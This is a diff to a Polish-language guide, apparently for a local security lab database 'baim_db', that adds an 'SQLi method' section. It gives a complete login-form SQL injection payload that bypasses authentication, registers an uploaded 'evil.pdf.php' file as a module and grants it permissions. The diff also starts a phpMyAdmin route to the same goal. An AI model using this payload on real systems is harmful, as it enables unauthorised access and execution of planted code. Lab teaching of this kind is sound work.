@@ -2,9 +2,17 @@
 
 ## Metoda SQLi
 
-Nie rozwodząc się za bardzo nad działaniem tego zapytania należy:
+Nie rozwodząc się za bardzo nad działaniem tego zapytania w formularzu logowania należy wprowadzić:
 
-## PhpMyAdmin
+```
+Login: ' OR 1=1; INSERT INTO modules(path, name) VALUES ('../../uploads/evil.pdf.php', 'Evil'); INSERT INTO permissions(module_id, user_id) VALUES (2, 1); --
+
+Hasło: <dowolne>
+```
+
+**Na końcu loginu jest spacja!**
+
+## phpMyAdmin
 
 1. Zaloguj się do panelu (localhost:8081) \
 2. Rozwiń bazę danych **baim_db** \
